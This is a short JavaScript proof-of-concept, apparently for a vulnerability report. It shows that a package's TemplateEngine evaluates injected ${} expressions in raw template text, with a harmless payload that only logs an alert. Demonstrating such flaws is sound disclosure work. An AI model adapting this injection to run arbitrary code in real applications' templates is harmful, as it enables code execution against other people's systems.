/**
 * Case 2: Template Literal Interpolation Injection
 *
 * This POC demonstrates how the ${} syntax in the template string is automatically
 * evaluated by JavaScript because the entire message is compiled into a template literal.
 *
 * Vulnerability: The TemplateEngine does not escape or sanitize the $ character
 * in the raw template text.
 *
 * Risk: Similar to backticks, if an attacker can inject ${} into the template source,
 * they can execute arbitrary JavaScript in the context of the render function.
 */

import {TemplateEngine} from "../packages/gramstax/src/template/engine.js"

console.log(`--- CASE 2: INTERPOLATION INJECTION ---`)

// The developer/attacker puts ${} directly in the message block.
// This is evaluated because the result of compilation is a `...` string.
const maliciousTemplate = `
  <base>
    <message>
      Server Time: \${console.log("!!! VULNERABILITY ALERT: Interpolation injection successful !!!") || new Date()}
    </message>
  </base>
`

console.log(`Compiling template...`)
const messages = TemplateEngine.compileBlockMessage(maliciousTemplate)

console.log(`Executing compiled function...`)
const result = messages.default.default({})
console.log(`Final Result:`, result)
